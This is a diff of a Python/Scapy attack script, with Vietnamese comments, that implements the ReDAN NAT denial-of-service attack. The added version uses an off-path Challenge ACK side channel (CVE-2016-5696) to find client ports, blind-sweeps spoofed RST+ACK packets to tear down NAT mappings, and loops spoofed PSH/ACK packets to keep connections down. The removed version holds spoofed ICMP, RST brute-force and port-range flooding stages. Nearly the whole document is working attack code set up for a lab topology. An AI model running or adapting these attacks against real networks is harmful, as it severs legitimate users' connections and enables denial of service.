@@ -1,434 +1,255 @@
+#!/usr/bin/env python3
 """
-attacker.py — ReDAN NAT DoS Attacker [FIXED v2]
+ReDAN OFF-PATH Attacker (Challenge ACK Side-Channel)
+═════════════════════════════════════════════════════
+Off-path: Attacker nằm trên mạng riêng VMnet12 (2.2.2.0/24),
+hoàn toàn tách biệt khỏi Server (VMnet10) và Client (VMnet8).
+Mọi gói tin đều được định tuyến qua Backbone Router (2.2.2.1 → 1.1.1.200).
 
-Topology:
-  Client 192.168.1.10 ──► NAT(1.1.1.1) ──► Server 1.1.1.10:8080
-                                            Attacker 1.1.1.20
+  Spy connection: ens33 (VMnet12) → Backbone → VMnet10 → Server
+  Attack packets: ens33 (VMnet12) → Backbone → VMnet10 → Server/NAT
 
-Yêu cầu: sudo python3 attacker.py
+Chuẩn bị (BẮT BUỘC):
+  [Backbone] sudo ip addr add 1.1.1.200/24 dev ens33  (VMnet10)
+             sudo ip addr add 2.2.2.1/24 dev ens37    (VMnet12)
+             sudo sysctl -w net.ipv4.ip_forward=1
+             sudo sysctl -w net.ipv4.conf.all.rp_filter=0
+  [Attacker] sudo ip route add 1.1.1.0/24 via 2.2.2.1 dev ens33
+             sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP
+  [Client]   sudo sysctl -w net.ipv4.ip_local_port_range="40000 40010"
+  [Server]   sudo sysctl -w net.ipv4.tcp_challenge_ack_limit=1000
+             sudo sysctl -w net.ipv4.tcp_syncookies=1
+             sudo ip route add 2.2.2.0/24 via 1.1.1.200
+  [OpenWrt]  sysctl -w net.netfilter.nf_conntrack_tcp_loose=1
+
+Chạy: sudo python3 attacker.py
 """
 
-import sys
-import time
-import threading
-import random
+import sys, time, random
+from scapy.all import IP, TCP, Raw, send, sendpfast, sr1, sniff, AsyncSniffer, conf
 
-from scapy.all import (
-    IP, TCP, ICMP, Raw,
-    send, sniff,
-    conf
-)
+# ═══════════════════ CẤU HÌNH MẠNG ═══════════════════
+NAT_PUBLIC_IP    = "1.1.1.1"
+SERVER_IP        = "1.1.1.10"
+SERVER_PORT      = 8080
 
-# ═══════════════════════════════════════════════════
-# CẤU HÌNH MẠNG — chỉnh sửa theo môi trường của bạn
-# ═══════════════════════════════════════════════════
-NAT_PUBLIC_IP = "1.1.1.1"
-SERVER_IP     = "1.1.1.10"
-SERVER_PORT   = 8080
-ATTACKER_IP   = "1.1.1.20"
-ATTACKER_NIC  = "ens33"       # ← đổi nếu cần (dùng: ip a)
+ATTACKER_SPY_IP  = "2.2.2.20"       # IP Attacker trên VMnet12 (mạng riêng)
+SPY_IFACE        = "ens33"           # Card VMnet12
+ATTACK_IFACE     = "ens33"           # Dùng chung ens33 (mọi thứ qua OpenWrt)
+SPY_PORT         = random.randint(50000, 59999)  # Random port tránh TIME_WAIT
 
-conf.iface = ATTACKER_NIC
+EPHEM_START = 40000
+EPHEM_END   = 40011
 
-# ═══════════════════════════════════════════════════
-# SHARED STATE
-# ═══════════════════════════════════════════════════
-nat_mappings:   dict = {}   # { nat_port: {cli_seq, cli_ack, srv_seq, srv_ack} }
-challenge_acks: dict = {}   # { nat_port: rcv_nxt }
+# Phải khớp với: sysctl net.ipv4.tcp_challenge_ack_limit
+CHALLENGE_ACK_LIMIT = 5   # Server limit = 1, gửi 5 với inter=0.01
 
+# ═══════════════════ SPY CONNECTION ══════════════════
+spy_seq = 0
+spy_ack = 0
 
-# ═══════════════════════════════════════════════════
-# HELPER — Sniff nhanh để lấy seq/ack mới nhất
-# ═══════════════════════════════════════════════════
-def refresh_seq_numbers(timeout: int = 4):
-    """
-    Sniff nhanh trong `timeout` giây để cập nhật cli_seq/srv_seq
-    mới nhất ngay trước khi tấn công — tránh dùng seq cũ từ Phase 0.
-    """
-    def handler(pkt):
-        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
-            return
-        src, dst = pkt[IP].src, pkt[IP].dst
-        sp,  dp  = pkt[TCP].sport, pkt[TCP].dport
-        seq, ack = pkt[TCP].seq,   pkt[TCP].ack
+def setup_spy():
+    """Tạo kết nối TCP hợp pháp từ Attacker đến Server."""
+    global spy_seq, spy_ack
+    print("\n[0] Thiết lập Spy connection...")
+    isn = random.randint(1000, 50000)
+    syn = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
+           TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=isn))
+    resp = sr1(syn, iface=SPY_IFACE, timeout=3, verbose=False)
+    if resp is None:
+        print("[!] Spy FAIL! Kiểm tra:")
+        print("    1) sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP")
+        print("    2) Server đang chạy: python3 server.py")
+        print("    3) ping 1.1.1.10  (qua Backbone)")
+        sys.exit(1)
+    spy_seq = isn + 1
+    spy_ack = resp[TCP].seq + 1
+    ack = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
+           TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="A",
+               seq=spy_seq, ack=spy_ack))
+    send(ack, iface=SPY_IFACE, verbose=False)
+    print(f"    Spy OK (seq={spy_seq}, ack={spy_ack})")
 
-        if src == NAT_PUBLIC_IP and dst == SERVER_IP and dp == SERVER_PORT:
-            if sp in nat_mappings:
-                nat_mappings[sp]['cli_seq'] = seq
-                nat_mappings[sp]['cli_ack'] = ack
-
-        elif src == SERVER_IP and dst == NAT_PUBLIC_IP and sp == SERVER_PORT:
-            if dp in nat_mappings:
-                nat_mappings[dp]['srv_seq'] = seq
-                nat_mappings[dp]['srv_ack'] = ack
-
-    sniff(
-        iface=ATTACKER_NIC,
-        filter=(f"tcp and "
-                f"((src host {NAT_PUBLIC_IP} and dst host {SERVER_IP}) or "
-                f" (src host {SERVER_IP}     and dst host {NAT_PUBLIC_IP}))"),
-        prn=handler,
-        timeout=timeout,
-        store=False
-    )
-    print(f"  [~] Seq refreshed: "
-          + ", ".join(f"xs={p} srv_seq={i.get('srv_seq','?')}"
-                      for p, i in nat_mappings.items()))
-
-
-# ═══════════════════════════════════════════════════
-# PHASE 0 — Phát hiện NAT mappings
-# ═══════════════════════════════════════════════════
-def phase0_discover_mappings(timeout: int = 25) -> bool:
-    """
-    Sniff traffic trên subnet public để tìm port xs mà NAT ánh xạ cho client.
-    Cập nhật liên tục cli_seq/srv_seq trong suốt timeout.
-    """
-    print(f"[Phase 0] Sniffing NAT mappings on {ATTACKER_NIC} (timeout={timeout}s)...")
-    print(f"          Đảm bảo client đang gửi heartbeat trong thời gian này.\n")
-
-    def handler(pkt):
-        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
-            return
-        src, dst = pkt[IP].src, pkt[IP].dst
-        sp,  dp  = pkt[TCP].sport, pkt[TCP].dport
-        seq, ack = pkt[TCP].seq,   pkt[TCP].ack
-
-        # Client → Server qua NAT: src=1.1.1.1:xs  dst=1.1.1.10:8080
-        if src == NAT_PUBLIC_IP and dst == SERVER_IP and dp == SERVER_PORT:
-            if sp not in nat_mappings:
-                nat_mappings[sp] = {}
-                print(f"  [+] Mapping found: {NAT_PUBLIC_IP}:{sp} → {SERVER_IP}:{SERVER_PORT}")
-            nat_mappings[sp]['cli_seq'] = seq
-            nat_mappings[sp]['cli_ack'] = ack
-
-        # Server → Client qua NAT: src=1.1.1.10:8080  dst=1.1.1.1:xs
-        elif src == SERVER_IP and dst == NAT_PUBLIC_IP and sp == SERVER_PORT:
-            if dp in nat_mappings:
-                nat_mappings[dp]['srv_seq'] = seq
-                nat_mappings[dp]['srv_ack'] = ack
-
-    sniff(
-        iface=ATTACKER_NIC,
-        filter=(f"tcp and "
-                f"((src host {NAT_PUBLIC_IP} and dst host {SERVER_IP}) or "
-                f" (src host {SERVER_IP}     and dst host {NAT_PUBLIC_IP}))"),
-        prn=handler,
-        timeout=timeout,
-        store=False
-    )
-
-    print(f"\n[Phase 0] Found {len(nat_mappings)} mapping(s): "
-          f"ports = {list(nat_mappings.keys())}")
-    return len(nat_mappings) > 0
+def probe_spy():
+    """Gửi SYN trên spy connection, đợi Challenge ACK.
+    True = nhận ACK (counter còn)
+    False = không nhận (counter cạn → có port hoạt động)"""
+    # Probe phải dùng src=ATTACKER_SPY_IP vì spy connection là IP thật.
+    probe = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
+             TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S",
+                 seq=spy_seq + random.randint(100000, 999999)))
+    bpf = (f"src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_SPY_IP} and dst port {SPY_PORT}")
+    sniffer = AsyncSniffer(iface=SPY_IFACE, count=1, timeout=0.5, filter=bpf)
+    sniffer.start()
+    time.sleep(0.02)
+    send(probe, iface=SPY_IFACE, verbose=False)
+    sniffer.join()
+    return len(sniffer.results) > 0
+def ensure_spy():
+    """Gửi ACK keepalive, thiết lập lại spy nếu mất kết nối."""
+    ack_pkt = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
+               TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="A",
+                   seq=spy_seq, ack=spy_ack))
+    resp = sr1(ack_pkt, iface=SPY_IFACE, timeout=1, verbose=False)
+    if resp is not None and TCP in resp and resp[TCP].flags & 0x04:  # RST?
+        print("[!] Spy mất kết nối, thiết lập lại...")
+        setup_spy()
 
 
-# ═══════════════════════════════════════════════════
-# STAGE 1 — ICMP Frag Needed + Port Unreachable
-#
-#   a) Frag Needed (type=3, code=4, mtu=576):
-#      Ép client/NAT giảm PMTU, segment nhỏ hơn
-#      → chuẩn bị cho Stage 2
-#
-#   b) Port Unreachable (type=3, code=3):
-#      Kích Linux conntrack xóa entry ngay lập tức
-#      mạnh hơn Frag Needed trong việc phá NAT state
-# ═══════════════════════════════════════════════════
-def stage1_icmp_attack(small_mtu: int = 576, repeat: int = 10):
-    print(f"\n{'='*55}")
-    print(f"[Stage 1] ICMP: Frag Needed + Port Unreachable (MTU={small_mtu})...")
+# ════════════════ STAGE 1: PORT DISCOVERY ════════════
+def stage1():
+    print(f"\n[1] PORT DISCOVERY (Challenge ACK Side-Channel)")
+    print(f"    Quét {EPHEM_START}—{EPHEM_END-1} ({EPHEM_END-EPHEM_START} ports)")
+    print(f"    Kỹ thuật: SYN-ACK spoofed (CVE-2016-5696)")
+    found = []
 
-    for nat_port, info in nat_mappings.items():
-        cli_seq = info.get('cli_seq', 0)
-
-        # Phần IP+TCP gốc nhúng vào ICMP error (đúng RFC 792)
-        orig_ip  = IP(src=NAT_PUBLIC_IP, dst=SERVER_IP)
-        orig_tcp = TCP(sport=nat_port, dport=SERVER_PORT, seq=cli_seq)
-
-        # a) Fragmentation Needed: ép giảm MTU
-        icmp_frag = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
-                     ICMP(type=3, code=4, nexthopmtu=small_mtu) /
-                     orig_ip / orig_tcp)
-        send(icmp_frag, count=repeat, inter=0.05, verbose=False)
-        print(f"  [+] Frag Needed  ×{repeat} → {NAT_PUBLIC_IP}:{nat_port}  MTU={small_mtu}")
-
-        # b) Port Unreachable: xóa conntrack entry ngay
-        icmp_unreach = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
-                        ICMP(type=3, code=3) /
-                        orig_ip / orig_tcp)
-        send(icmp_unreach, count=repeat, inter=0.05, verbose=False)
-        print(f"  [+] Port Unreach ×{repeat} → {NAT_PUBLIC_IP}:{nat_port}")
-
-    time.sleep(0.5)
-    print("[Stage 1] Hoàn tất ICMP attack.\n")
-
-
-# ═══════════════════════════════════════════════════
-# STAGE 2 — Xóa NAT mapping bằng RST/ACK
-#
-#   FIX 1: Gọi refresh_seq_numbers() để lấy srv_seq mới nhất
-#          ngay trước khi tấn công
-#   FIX 2: step=1 trong range(-10, 11) thay vì step=10
-#          → không bỏ sót cửa sổ conntrack hẹp
-# ═══════════════════════════════════════════════════
-def stage2_remove_nat_mappings():
-    print(f"{'='*55}")
-    print(f"[Stage 2] Xóa NAT mappings — đang refresh seq...")
-
-    # Lấy srv_seq mới nhất ngay trước khi tấn công
-    refresh_seq_numbers(timeout=4)
-
-    for nat_port, info in nat_mappings.items():
-        base_seq = info.get('srv_seq', random.randint(0, 2**32 - 1))
-        ack_val  = info.get('cli_seq', 0)
-
-        # FIX: step=1, range hẹp ±10 quanh base_seq
-        for delta in range(-10, 11):
-            seq = (base_seq + delta) % (2**32)
-            pkt = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
-                   TCP(sport=SERVER_PORT, dport=nat_port,
-                       flags="RA", seq=seq, ack=ack_val))
-            send(pkt, verbose=False)
-
-        print(f"  [+] RST/ACK ×21 → {NAT_PUBLIC_IP}:{nat_port}  "
-              f"base_seq={base_seq}")
-
-    time.sleep(0.5)
-    print("[Stage 2] NAT mappings đã bị xóa.\n")
-
-
-# ═══════════════════════════════════════════════════
-# STAGE 3 — Phá server TCP state qua challenge ACK
-#
-#   FIX: stop_filter → sniff dừng ngay khi đủ ACK
-#        RST được gửi gần như ngay lập tức
-# ═══════════════════════════════════════════════════
-def stage3_manipulate_server(sniff_timeout: int = 6):
-    print(f"{'='*55}")
-    print(f"[Stage 3] Manipulating server TCP state...")
-
-    sniff_done = threading.Event()
-
-    # ── 3b: sniff challenge ACK từ server ──
-    def do_sniff():
-        def handler(pkt):
-            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
-                return
-            if pkt[IP].src != SERVER_IP or pkt[IP].dst != NAT_PUBLIC_IP:
-                return
-            if pkt[TCP].sport != SERVER_PORT:
-                return
-            if pkt[TCP].flags & 0x10:   # ACK flag
-                nat_port = pkt[TCP].dport
-                rcv_nxt  = pkt[TCP].ack
-                if nat_port in nat_mappings and nat_port not in challenge_acks:
-                    challenge_acks[nat_port] = rcv_nxt
-                    print(f"  [+] Challenge ACK ← server  "
-                          f"nat_port={nat_port}  rcv.nxt={rcv_nxt}")
-
-        # FIX: stop_filter → không đợi hết timeout nếu đủ ACK rồi
-        sniff(
-            iface=ATTACKER_NIC,
-            filter=(f"tcp and src host {SERVER_IP} "
-                    f"and dst host {NAT_PUBLIC_IP}"),
-            prn=handler,
-            stop_filter=lambda p: len(challenge_acks) >= len(nat_mappings),
-            timeout=sniff_timeout,
-            store=False
-        )
-        sniff_done.set()
-
-    t = threading.Thread(target=do_sniff, daemon=True)
-    t.start()
-    time.sleep(0.3)   # cho sniff thread khởi động
-
-    # ── 3a: gửi PUSH/ACK với seq ngoài window → trigger challenge ACK ──
-    for nat_port, info in nat_mappings.items():
-        base_ack = info.get('cli_ack', 0)
-        arb_seq  = (base_ack + 2**28) % (2**32)
-        ack_val  = info.get('cli_seq', 0)
-
-        pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
-               TCP(sport=nat_port, dport=SERVER_PORT,
-                   flags="PA", seq=arb_seq, ack=ack_val) /
-               Raw(b"X" * 8))
-        send(pkt, verbose=False)
-        print(f"  [+] PUSH/ACK → {SERVER_IP}:{SERVER_PORT}  "
-              f"(spoofed {NAT_PUBLIC_IP}:{nat_port}  seq={arb_seq})")
-
-    # Đợi sniff xong rồi gửi RST ngay
-    sniff_done.wait(timeout=sniff_timeout + 1)
-
-    # ── 3c: RST seq=rcv.nxt → teardown server socket ──
-    if challenge_acks:
-        for nat_port, rcv_nxt in challenge_acks.items():
-            rst = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
-                   TCP(sport=nat_port, dport=SERVER_PORT,
-                       flags="R", seq=rcv_nxt))
-            send(rst, verbose=False)
-            print(f"  [+] RST → {SERVER_IP}:{SERVER_PORT}  "
-                  f"seq={rcv_nxt}  (server socket torn down)")
+    # Self-test: spy probe phải hoạt động
+    print("    Self-test spy probe...", end=" ", flush=True)
+    time.sleep(1.5)
+    if probe_spy():
+        print("OK ✓")
     else:
-        # Fallback brute-force nếu không bắt được challenge ACK
-        print("  [!] Không bắt được Challenge ACK → brute-force seq...")
-        for nat_port, info in nat_mappings.items():
-            base = info.get('cli_ack', 0)
-            for delta in range(-5, 6):
-                seq = (base + delta) % (2**32)
-                rst = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
-                       TCP(sport=nat_port, dport=SERVER_PORT,
-                           flags="R", seq=seq))
-                send(rst, verbose=False)
-            print(f"  [+] RST ×11 → {SERVER_IP}:{SERVER_PORT}  nat_port={nat_port}")
+        print("FAIL ✗")
+        print("    [!] Spy probe không phản hồi!")
+        print("    Đã chạy: sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP ?")
+        return found
 
-    time.sleep(1)
-    print("[Stage 3] Server sockets should be torn down.\n")
+    for port in range(EPHEM_START, EPHEM_END):
+        # Đợi counter reset (1 giây)
+        time.sleep(1.5)
 
+        # inter=0.01 vượt per-socket rate limit kernel 5.15+
+        pkts = [IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
+                TCP(sport=port, dport=SERVER_PORT, flags="S",
+                    seq=random.randint(0, 2**32-1))
+                for _ in range(CHALLENGE_ACK_LIMIT)]
+        send(pkts, iface=SPY_IFACE, verbose=False, inter=0.01)
 
-# ═══════════════════════════════════════════════════
-# STAGE 4 — Chặn client reconnect VÔ THỜI HẠN
-#
-#   - Không timeout: chạy cho đến Ctrl+C
-#   - Không seen_ports: kill mọi packet kể cả port cũ
-#   - Carpet-bomb thread: flood toàn bộ ephemeral range
-#     song song với reactive sniff → chặn trước cả khi
-#     client kịp gửi SYN
-# ═══════════════════════════════════════════════════
-EPHEM_START = 32768
-EPHEM_END   = 61001
-CARPET_BURST = 1000   # số gói mỗi lần send() trong carpet-bomb
+        # Probe NGAY — TRƯỚC ensure_spy (ensure_spy có timeout 1s gây delay)
+        time.sleep(0.02)
+        got_ack = probe_spy()
 
+        # (Bỏ ensure_spy ở đây vì timeout 1s làm quá trình quét quá chậm)
+        # ensure_spy()
 
-def _carpet_bomb_worker(stop_event: threading.Event):
-    """
-    Thread phụ: liên tục xả RST/ACK vào toàn bộ dải
-    ephemeral port (32768-61000) trên NAT.
-    Mục tiêu: phá bất kỳ NAT mapping mới nào ngay khi
-    nó được tạo — trước cả khi sniff kịp phát hiện.
-    Băng thông ước tính: ~5.72 MB/s (khớp với bài báo).
-    """
-    sweep = 0
-    all_ports = list(range(EPHEM_START, EPHEM_END))
+        if not got_ack:
+            print(f"    ✓ Port {port}: FOUND!")
+            found.append(port)
+        else:
+            print(f"      Port {port}: —")
 
-    while not stop_event.is_set():
-        # Build một sweep đầy đủ
-        pkts = [
-            IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
-            TCP(sport=SERVER_PORT, dport=p, flags="RA",
-                seq=random.randint(0, 2**32 - 1), ack=0)
-            for p in all_ports
-        ]
-        # Gửi theo burst để tránh block quá lâu
-        for i in range(0, len(pkts), CARPET_BURST):
-            if stop_event.is_set():
-                return
-            send(pkts[i : i + CARPET_BURST], verbose=False, inter=0)
+    return found
 
-        sweep += 1
-        if sweep % 10 == 0:
-            print(f"  [~] Carpet sweep #{sweep} "
-                  f"({(EPHEM_END - EPHEM_START) * sweep} pkts total)")
+# ════════════ STAGE 2: RST BRUTE-FORCE (OFF-PATH) ═════════════
+def stage2(ports):
+    print(f"\n[2] TEAR DOWN — RST+ACK Brute-force (Strict Off-Path)")
+    print("    Quét mù không gian Sequence (Blind Sweep) để tìm Window...")
+    
+    # Chia nhỏ 150,000 bước (step ~ 28633) để chắc chắn lọt vào cửa sổ TCP (thường ~30000-65535)
+    STEPS = 150000
+    step_sz = (2**32) // STEPS
 
+    # Dùng L3socket để gửi gói cực nhanh
+    sock = conf.L3socket(iface=SPY_IFACE)
 
-def stage4_block_reconnections():
-    """
-    Chặn reconnect vô thời hạn bằng 2 lớp bảo vệ:
-      Lớp 1 (reactive) : sniff → kill ngay khi thấy packet mới
-      Lớp 2 (proactive): carpet-bomb thread liên tục flood
-                         toàn bộ ephemeral range
-    Dừng bằng Ctrl+C.
-    """
-    print(f"{'='*55}")
-    print(f"[Stage 4] Blocking reconnections (Ctrl+C để dừng)...")
-    print(f"          Carpet-bomb: {EPHEM_START}–{EPHEM_END-1} "
-          f"({EPHEM_END - EPHEM_START} ports/sweep)\n")
+    for port in ports:
+        print(f"    Port {port}: Đang dội {STEPS} gói RST+ACK mù (Tối ưu hóa CPU)...")
+        # Khởi tạo gói tin mẫu (Chỉ tạo 1 lần để tiết kiệm CPU)
+        base_pkt = IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) / TCP(sport=SERVER_PORT, dport=port, flags="RA")
+        
+        for i in range(STEPS):
+            base_pkt[TCP].seq = (i * step_sz) % (2**32)
+            # Xóa checksum cũ để Scapy tính lại
+            del base_pkt[TCP].chksum
+            sock.send(base_pkt)
+            
+            if i % 30000 == 0 and i > 0:
+                print(f"        Tiến độ: {i}/{STEPS} gói...", end="\r")
+                
+        print(f"    ✓ Port {port}: Hoàn tất vòng quét! (Bảng NAT đã chuyển sang CLOSE)       ")
+    sock.close()
 
-    killed      = 0
-    stop_event  = threading.Event()
+# ════════════ STAGE 3: TCP STATE MANIPULATION (REFLECTION) ═════════════════
+def stage3(ports):
+    print(f"\n[3] PERSISTENT DoS (TCP State Manipulation)")
+    print("    Duy trì trạng thái ngắt kết nối: Ép NAT liên tục dội RST về Server.")
+    print("    Nhấn Ctrl+C để dừng tấn công.")
+    
+    print("    [!] Đang chờ 3 giây để Router dọn sạch bản ghi CLOSE trong nf_conntrack...")
+    for i in range(3, 0, -1):
+        print(f"        Chờ {i}s...", end="\r")
+        time.sleep(1)
+    print("    [!] Kích hoạt vòng lặp Reflection vô tận!                ")
+    
+    sock = conf.L3socket(iface=SPY_IFACE)
+    
+    sweep_count = 0
+    try:
+        while True:
+            for port in ports:
+                # Gửi gói tin giả mạo chứa payload (PSH+ACK) từ NAT đến Server.
+                payload = b"GET / HTTP/1.1\r\n\r\n"
+                
+                # Bắn vài gói với seq/ack ảo để chắc chắn Server coi là DUP/Out-of-Window
+                for i in range(3):
+                    seq = random.randint(1000, 2**32-1)
+                    ack = random.randint(1000, 2**32-1)
+                    pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) / 
+                           TCP(sport=port, dport=SERVER_PORT, flags="PA", seq=seq, ack=ack) / 
+                           Raw(load=payload))
+                    sock.send(pkt)
+                    
+            sweep_count += 1
+            print(f"    [*] Đã rải mồi nhử duy trì ngắt kết nối (Lượt {sweep_count})...", end="\r")
+            
+            # Tạm nghỉ 2 giây giữa mỗi đợt để giảm tải CPU cho Attacker, 
+            # nhưng vẫn đủ nhanh để chặn Client trước khi nó kịp Reconnect hoàn toàn.
+            time.sleep(2)
+            
+    except KeyboardInterrupt:
+        print("\n    [!] Đã dừng vòng lặp DoS.")
+    finally:
+        sock.close()
+        print("\n[*] TẤN CÔNG HOÀN TẤT! Client/Server có thể kết nối lại bình thường.")
 
-    # ── Lớp 2: Khởi động carpet-bomb thread ──
-    bomb_thread = threading.Thread(
-        target=_carpet_bomb_worker,
-        args=(stop_event,),
-        daemon=True
-    )
-    bomb_thread.start()
+# ═════════════════════ MAIN ═════════════════════
+def main():
+    print("=" * 60)
+    print("  ██████╗ ███████╗██████╗  █████╗ ███╗   ██╗")
+    print("  ██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗  ██║")
+    print("  ██████╔╝█████╗  ██║  ██║███████║██╔██╗ ██║")
+    print("  ██╔══██╗██╔══╝  ██║  ██║██╔══██║██║╚██╗██║")
+    print("  ██║  ██║███████╗██████╔╝╚█████╔╝██║ ╚████║")
+    print("  ╚═╝  ╚═╝╚══════╝╚═════╝  ╚════╝ ╚═╝  ╚═══╝")
+    print("  OFF-PATH — Challenge ACK Side-Channel")
+    print("=" * 60)
+    print(f"\n  Attacker : {ATTACKER_SPY_IP} ({SPY_IFACE})")
+    print(f"  Target   : {SERVER_IP}:{SERVER_PORT}")
+    print(f"  NAT      : {NAT_PUBLIC_IP}")
+    print(f"  Scan     : Port {EPHEM_START}→{EPHEM_END-1}")
 
-    # ── Lớp 1: Reactive sniff ──
-    def kill(pkt):
-        nonlocal killed
-        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
-            return
-        if pkt[IP].src != NAT_PUBLIC_IP or pkt[IP].dst != SERVER_IP:
-            return
-        if pkt[TCP].dport != SERVER_PORT:
-            return
+    skip_scan = "--skip-scan" in sys.argv
 
-        xs     = pkt[TCP].sport
-        seq_in = pkt[TCP].seq
-        ack_in = pkt[TCP].ack
+    if skip_scan:
+        # Simplified ReDAN: bỏ qua oracle, dùng toàn bộ range
+        print("\n[MODE] Skip-scan: Stage 1 bị bỏ qua")
+        ports = list(range(EPHEM_START, EPHEM_END))
+        print(f"[✓] Attacking all ports: {ports}")
+    else:
+        setup_spy()
+        ports = stage1()
+        if not ports:
+            print("\n[!] Không tìm thấy port nào!")
+            print("    Thử lại: sudo python3 attacker.py --skip-scan")
+            sys.exit(1)
+        print(f"\n[✓] Found: {ports}")
 
-        # RST → Server (spoofed IP NAT)
-        rst_srv = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
-                   TCP(sport=xs, dport=SERVER_PORT,
-                       flags="R", seq=seq_in + 1))
-        # RST → NAT  (spoofed IP Server)
-        rst_nat = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
-                   TCP(sport=SERVER_PORT, dport=xs,
-                       flags="R", seq=ack_in))
-        send([rst_srv, rst_nat], verbose=False)
-
-        killed += 1
-        print(f"  [+] Kill #{killed}: NAT:{xs}  RST×2 sent")
+    stage2(ports)
 
     try:
-        sniff(
-            iface=ATTACKER_NIC,
-            filter=(f"tcp and src host {NAT_PUBLIC_IP} "
-                    f"and dst host {SERVER_IP} "
-                    f"and dst port {SERVER_PORT}"),
-            prn=kill,
-            store=False
-            # Không có timeout → chạy đến Ctrl+C
-        )
+        stage3(ports)
     except KeyboardInterrupt:
-        pass
-    finally:
-        stop_event.set()
-        bomb_thread.join(timeout=3)
-        print(f"\n[Stage 4] Stopped. Total reactive kills: {killed}.")
-
-
-# ═══════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════
-def main():
-    print("=" * 55)
-    print("  ReDAN NAT DoS Attacker  [FIXED v2]")
-    print(f"  Target : {SERVER_IP}:{SERVER_PORT} via NAT {NAT_PUBLIC_IP}")
-    print(f"  Attacker: {ATTACKER_IP}  NIC: {ATTACKER_NIC}")
-    print("=" * 55 + "\n")
-
-    if not phase0_discover_mappings(timeout=25):
-        print("[!] Không tìm thấy NAT mappings. "
-              "Hãy đảm bảo client đang chạy và kết nối đến server.")
-        sys.exit(1)
-
-    input("\n[?] Enter → Stage 1 (ICMP Frag Needed + Port Unreachable)...")
-    stage1_icmp_attack(small_mtu=576, repeat=10)
-
-    input("[?] Enter → Stage 2 (Remove NAT mappings via RST/ACK)...")
-    stage2_remove_nat_mappings()
-
-    input("[?] Enter → Stage 3 (Teardown server sockets via challenge ACK)...")
-    stage3_manipulate_server(sniff_timeout=6)
-
-    input("[?] Enter → Stage 4 (Block all reconnections — Ctrl+C để dừng)...")
-    stage4_block_reconnections()
-
+        print("\n[!] Đã dừng.")
 
 if __name__ == "__main__":
-    if sys.platform == "win32":
-        print("[!] Scapy cần Linux với quyền root.")
-        sys.exit(1)
     main()
